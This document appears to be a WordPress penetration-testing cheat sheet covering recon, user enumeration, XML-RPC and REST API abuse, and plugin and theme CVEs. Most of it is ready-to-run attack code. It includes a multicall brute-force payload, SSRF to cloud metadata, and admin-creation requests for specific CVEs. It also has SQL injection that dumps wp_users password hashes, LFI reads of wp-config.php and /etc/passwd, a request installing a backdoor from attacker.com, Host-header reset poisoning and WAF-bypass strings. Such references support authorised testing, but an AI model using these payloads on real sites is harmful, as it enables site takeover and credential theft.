---
tags:
  - high
  - server-side
---

# WordPress Security

*WordPress attack surface: plugin/theme CVEs, REST API, XML-RPC, user enumeration, privilege escalation, and common misconfigurations.*

---

## TL;DR

```bash
# Version detection
curl -s https://target.com/readme.html | grep -i 'version'
curl -s https://target.com/ | grep -oP '(?<=content="WordPress )[^"]*'

# User enumeration
curl -s https://target.com/wp-json/wp/v2/users | python3 -m json.tool

# XML-RPC enabled check
curl -s -X POST https://target.com/xmlrpc.php \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>'

# Full recon
wpscan --url https://target.com --enumerate u,ap,vp --api-token $TOKEN
```

---

## How It Works

WordPress is a PHP CMS powering ~40% of the web. Attack surface:

1. **Plugins** — 60,000+ plugins, most vulns are here (SQLi, LFI, priv esc)
2. **REST API** — Enabled by default, exposes users and content
3. **XML-RPC** — Legacy protocol bypasses 2FA, enables SSRF via pingback
4. **Admin AJAX** — `admin-ajax.php` handles authenticated AND unauthenticated plugin actions
5. **Themes** — Direct file inclusion, file deletion, auth bypass patterns
6. **Core misconfigs** — Debug log, wp-config backups, exposed directories

---

## Detection

```bash
# Fingerprinting
curl -s https://target.com | grep -i 'wordpress\|wp-content\|wp-includes'
curl -s https://target.com/wp-login.php  # 200 = WordPress confirmed

# Version
curl -s https://target.com/readme.html | grep -i 'version'
curl -s https://target.com/license.txt | grep -i 'version'
curl -s https://target.com/ | grep -oP '(?<=content="WordPress )[^"]*'
curl -s https://target.com/ | grep -oP '(?<=\?ver=)[0-9.]+' | sort -u

# Plugins (passive)
curl -s https://target.com/ | grep -oP '(?<=wp-content/plugins/)[^/"]+' | sort -u

# Plugin version
curl -s https://target.com/wp-content/plugins/PLUGIN/readme.txt | grep -i 'stable tag\|version'
```

---

## User Enumeration

```bash
# REST API (default on)
curl -s "https://target.com/wp-json/wp/v2/users" | python3 -m json.tool
curl -s "https://target.com/wp-json/wp/v2/users?per_page=100" | \
  python3 -c "import sys,json; [print(u['slug'], u.get('name','')) for u in json.load(sys.stdin)]"

# Author archive brute force
for i in $(seq 1 20); do
  result=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "https://target.com/?author=$i")
  echo "ID $i: $result"
done

# oEmbed (leaks username even when wp/v2/users is disabled)
curl -s "https://target.com/wp-json/oembed/1.0/embed?url=https://target.com/SOME-POST-SLUG"

# Login error message (different for valid vs invalid username)
curl -s -X POST "https://target.com/wp-login.php" \
  -d "log=admin&pwd=wrongpass" | grep -i "error\|incorrect"
# "incorrect password" → username exists
# "Invalid username" → username doesn't exist
```

---

## XML-RPC Exploitation

### Basic Detection

```bash
curl -s -X POST https://target.com/xmlrpc.php \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>'
# Returns method list → XML-RPC active
```

### Brute Force (multicall — Bypass Rate Limiting)

One HTTP request = hundreds of auth attempts:

```xml
POST /xmlrpc.php HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><array><data>
          <value><string>admin</string></value>
          <value><string>password1</string></value>
        </data></array></value>
      </data></array></value></member>
    </struct></value>
    <!-- Repeat with different passwords -->
  </data></array></value></param></params>
</methodCall>
```

!!! tip "WAF bypass"
    WAFs often rate-limit `/wp-login.php` but not `/xmlrpc.php`. Each `system.multicall` call can test 500+ passwords in one HTTP request.

### SSRF via pingback.ping

```bash
# SSRF to internal service
curl -s -X POST https://target.com/xmlrpc.php \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
<param><value><string>https://target.com/some-post/</string></value></param>
</params>
</methodCall>'

# Port scanning (faultCode 17 = port open, 16 = filtered)
# Change IP:PORT to scan
```

### 2FA Bypass via XML-RPC

```bash
# XML-RPC doesn't support 2FA
# If credentials are valid but wp-login has 2FA:
curl -X POST https://target.com/xmlrpc.php \
  -d '<methodCall><methodName>wp.getUsersBlogs</methodName><params>
  <param><value>admin</value></param>
  <param><value>VALID_PASS</value></param>
  </params></methodCall>'
```

---

## REST API Attacks

```bash
# User data
curl -s "https://target.com/wp-json/wp/v2/users"

# Drafts (auth required but check anyway)
curl -s "https://target.com/wp-json/wp/v2/posts?status=draft"

# Media listing
curl -s "https://target.com/wp-json/wp/v2/media"

# SSRF via oEmbed proxy
curl "https://target.com/wp-json/oembed/1.0/proxy?url=http://169.254.169.254/latest/meta-data/"

# Route discovery
curl -s "https://target.com/wp-json/" | python3 -m json.tool | grep '"href"' | head -50

# WooCommerce AJAX (often less protected)
curl "https://target.com/?wc-ajax=ENDPOINT"
```

---

## Critical Plugin CVEs

### Unauthenticated Privilege Escalation

| Plugin | Installs | CVE | Version | Attack |
|--------|----------|-----|---------|--------|
| WooCommerce Payments | 5M+ | CVE-2023-28121 | ≤ 5.6.1 | `X-Wcpay-Platform-Checkout-User: 1` → create admin |
| OttoKit/SureTriggers | 100K+ | CVE-2025-27007 | ≤ 1.0.82 | Unauthenticated connection key → admin creation |
| Really Simple Security | 4M+ | CVE-2024-10924 | 9.0.0–9.1.1.1 | REST 2FA bypass → admin access |
| LiteSpeed Cache | 6M+ | CVE-2024-28000 | ≤ 6.3.0.1 | Unauthenticated priv esc → admin |
| Ultimate Member | 2M+ | CVE-2023-3460 | ≤ 2.6.6 | Registration with role param → admin |

```bash
# CVE-2023-28121 — WooCommerce Payments
POST /wp-json/wp/v2/users HTTP/1.1
X-Wcpay-Platform-Checkout-User: 1
Content-Type: application/json

{"username":"attacker","email":"a@evil.com","password":"P@ss!","roles":["administrator"]}
```

```bash
# CVE-2025-27007 — OttoKit
# Step 1: Get connection key
curl -X POST https://target.com/wp-json/sure-triggers/v1/connection/create-wp-connection \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin"}'
# → {"key":"CONN_KEY",...}

# Step 2: Create admin
curl -X POST https://target.com/wp-json/sure-triggers/v1/users \
  -H 'Content-Type: application/json' \
  -H "X-Connection-Key: CONN_KEY" \
  -d '{"username":"pwn","email":"p@evil.com","password":"P@ss!","role":"administrator"}'
```

### Unauthenticated SQLi

| Plugin | CVE | Version | Vector |
|--------|-----|---------|--------|
| LayerSlider | CVE-2024-2879 | 7.9.11–7.10.0 | `ls_get_popup_markup` AJAX action |
| WordPress Automatic | CVE-2024-27956 | ≤ 3.92.0 | CSV export auth bypass |
| Depicter Slider | CVE-2025-2011 | ≤ 3.6.1 | `depicter_search` action `s` param |
| Email Subscribers | CVE-2024-2876 | ≤ 5.7.14 | `IG_ES_Subscribers_Query::run()` |
| The Events Calendar | CVE-2025-9807 | 2025 | Autocomplete `term` param (time-based) |

```bash
# CVE-2024-2879 — LayerSlider
curl -s "https://target.com/wp-admin/admin-ajax.php" \
  -d "action=ls_get_popup_markup&id=1 UNION SELECT user_login,user_pass,3,4,5,6,7,8,9 FROM wp_users-- -"

# CVE-2025-2011 — Depicter Slider
curl -G "https://target.com/wp-admin/admin-ajax.php" \
  --data-urlencode 'action=depicter_search' \
  --data-urlencode "s=' UNION SELECT user_login,user_pass,3 FROM wp_users-- -"
```

### LFI / File Read

| Plugin | CVE | Version | Param |
|--------|-----|---------|-------|
| Kubio AI Page Builder | CVE-2025-2294 | ≤ 2.5.1 | `__kubio-site-edit-iframe-classic-template` |
| WP Job Portal | Multiple 2024 | Recent | `file` (admin-post.php) |
| Ads Pro | CVE-2025-4689 | Vulnerable | SQLi → LFI chain |

```bash
# CVE-2025-2294 — Kubio
curl -i "https://target.com/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
curl -i "https://target.com/?__kubio-site-edit-iframe-classic-template=../../../../../../etc/passwd"
```

### Unauthenticated RCE

```bash
# CVE-2024-25600 — Bricks Builder (≤ 1.9.6)
# Predictable nonce + arbitrary PHP execution via REST API
# PoC: https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT

# CVE-2025-1562 — FunnelKit Automations (≤ 3.5.3)
curl -X POST https://target.com/wp-json/funnelkit-ns/plugin/install_and_activate \
  -H 'Content-Type: application/json' \
  -d '{"slug":"malicious-plugin","source":"https://attacker.com/backdoor.zip"}'
```

---

## Theme Vulnerabilities

```bash
# Litho Theme (< 3.1) — Delete wp-config.php → force reinstall (full takeover)
curl -X POST https://target.com/wp-admin/admin-ajax.php \
  -d 'action=litho_remove_font_family_action_data' \
  -d 'fontfamily=../../../../wp-config.php'

# Jobmonster — Auth bypass via bogus social provider
POST /wp-admin/admin-ajax.php
action=jobmonster_social_login&using=bogus&id=admin@target.com
# Returns: {"status":"success"} + admin session cookie
```

---

## Information Disclosure

### Sensitive File Checklist

```bash
TARGET="https://target.com"

# WordPress version
for f in readme.html license.txt; do
  curl -s "$TARGET/$f" | grep -i 'version' | head -3
done

# Debug log
curl -s "$TARGET/wp-content/debug.log" | head -20

# Config backups
for ext in bak backup old txt ~ swp save; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET/wp-config.php.$ext")
  [ "$code" = "200" ] && echo "FOUND: $TARGET/wp-config.php.$ext"
done

# DB backups
for f in wp-content/backup-db/ wp-content/backups/ wp-content/mysql.sql backup.sql; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET/$f")
  echo "$code $TARGET/$f"
done

# Phpinfo
for f in phpinfo.php info.php test.php; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET/$f")
  [ "$code" = "200" ] && echo "FOUND: $TARGET/$f"
done
```

---

## Privilege Escalation Patterns

### wp_ajax_nopriv_ → Unauthenticated Action

```bash
# Every add_action('wp_ajax_nopriv_XXX') = accessible without auth
POST /wp-admin/admin-ajax.php
action=XXX&[params]

# Find in plugin code:
grep -r "wp_ajax_nopriv_" /wp-content/plugins/ --include="*.php"
```

### Nonce ≠ Authorization

```php
// VULNERABLE pattern (common in plugins):
check_ajax_referer('action', 'nonce');   // ← CSRF check only
// No current_user_can() → any subscriber can access

// SECURE pattern:
check_ajax_referer('action', 'nonce');
if (!current_user_can('manage_options')) wp_die('Denied');
```

### REST API — Missing permission_callback

```bash
# Routes registered with permission_callback: '__return_true' are accessible to all
grep -r "permission_callback.*__return_true\|permission_callback.*true" /wp-content/plugins/ --include="*.php"

# Enumerate REST routes
curl -s "https://target.com/wp-json/" | python3 -m json.tool | grep '"namespace"'
```

---

## SSRF Vectors

```bash
# Via XML-RPC pingback
curl -X POST https://target.com/xmlrpc.php \
  -H 'Content-Type: text/xml' \
  -d '<methodCall><methodName>pingback.ping</methodName>
  <params>
  <param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
  <param><value><string>https://target.com/any-post/</string></value></param>
  </params></methodCall>'

# Via oEmbed proxy
curl "https://target.com/wp-json/oembed/1.0/proxy?url=http://169.254.169.254/"
curl "https://target.com/wp-json/oembed/1.0/proxy?url=https://ATTACKER.INTERACTSH.COM"
```

---

## Password Reset Poisoning

```http
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

user_login=admin&redirect_to=
```

The reset link sent to the victim contains `attacker.com` in the URL. If victim clicks → token captured.

---

## WAF Bypass for WordPress

```bash
# Wordfence SQLi bypass (boolean-based, no UNION)
# ❌ Blocked: id=1 UNION SELECT user_login,user_pass FROM wp_users--
# ✅ Passes:
id=1 AND ASCII(SUBSTRING(database(),1,1)) > 114
id=1 AND LENGTH(database()) > 5
id=1 AND ASCII(SUBSTRING((SELECT GROUP_CONCAT(user_login) FROM wp_users),1,1)) > 97

# Comment-based UNION
1/**/UNION/**/SELECT/**/user_pass/**/FROM/**/wp_users

# Case variation
1 uNiOn SeLeCt UsEr_PaSs fRoM wP_UsErS

# Rate limit bypass via xmlrpc (multicall)
# Endpoints often less filtered than /wp-login.php
POST /xmlrpc.php  # system.multicall

# Less-filtered endpoints
/wp-admin/admin-ajax.php    # Plugin-specific actions
/wp-json/NAMESPACE/ROUTE    # REST API routes
/?wc-ajax=ENDPOINT          # WooCommerce AJAX
```

---

## Rapid Recon (5 minutes)

```bash
TARGET="https://target.com"

echo "[*] Version:"
curl -s $TARGET/readme.html | grep -i 'wordpress\|version' | head -3

echo "[*] Users:"
curl -s "$TARGET/wp-json/wp/v2/users?per_page=10" | \
  python3 -c "import sys,json; [print(u.get('name',''),u.get('slug','')) for u in json.load(sys.stdin)]" 2>/dev/null

echo "[*] Plugins (passive):"
curl -s $TARGET/ | grep -oP '(?<=wp-content/plugins/)[^/"]+' | sort -u

echo "[*] Debug log:"
curl -s "$TARGET/wp-content/debug.log" | head -5

echo "[*] XML-RPC:"
curl -s -X POST "$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' | \
  grep -q "methodResponse" && echo "ACTIVE" || echo "disabled"

echo "[*] Registration:"
curl -s "$TARGET/wp-login.php?action=register" | grep -ic "Register For This Site"
```

---

## Tools

| Tool | Purpose |
|------|---------|
| `wpscan --url TARGET --enumerate u,ap,vp` | Full WordPress recon |
| `nuclei -u TARGET -tags wordpress` | CVE/config detection |
| `hydra` / `wpscan --passwords` | Credential brute force |
| `sqlmap --data "action=X&id=1*"` | SQLi exploitation |
| WPXStrike | XSS → admin → RCE escalation |
| quickpress | SSRF check (xmlrpc + oembed) |

---

## Checklist

- [ ] WordPress version via readme.html / license.txt
- [ ] Plugin enumeration (passive from source, active with WPScan)
- [ ] Cross-reference plugin versions against CVEs
- [ ] User enumeration (`/wp-json/wp/v2/users`, author brute force)
- [ ] XML-RPC active? (multicall brute force, pingback SSRF, 2FA bypass)
- [ ] Debug log exposed (`/wp-content/debug.log`)
- [ ] wp-config.php backups (`.bak`, `.old`, `.txt`, `.~`)
- [ ] REST API routes → find missing `permission_callback`
- [ ] `wp_ajax_nopriv_` handlers in plugins
- [ ] SSRF via xmlrpc pingback / oEmbed proxy
- [ ] Registration open → role escalation?
- [ ] Password reset poisoning via Host header

---

## References

- [WPScan Vulnerability Database](https://wpscan.com/vulnerability/)
- [Patchstack Database](https://patchstack.com/database/)
- [Wordfence Intelligence](https://www.wordfence.com/threat-intel/)
- [CVE-2024-25600 — Bricks Builder RCE](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)
- [CVE-2023-28121 — WooCommerce Payments Priv Esc](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/)
- [PayloadsAllTheThings — WordPress](https://github.com/carlospolop/PayloadsAllTheThings/tree/master/WordPress)
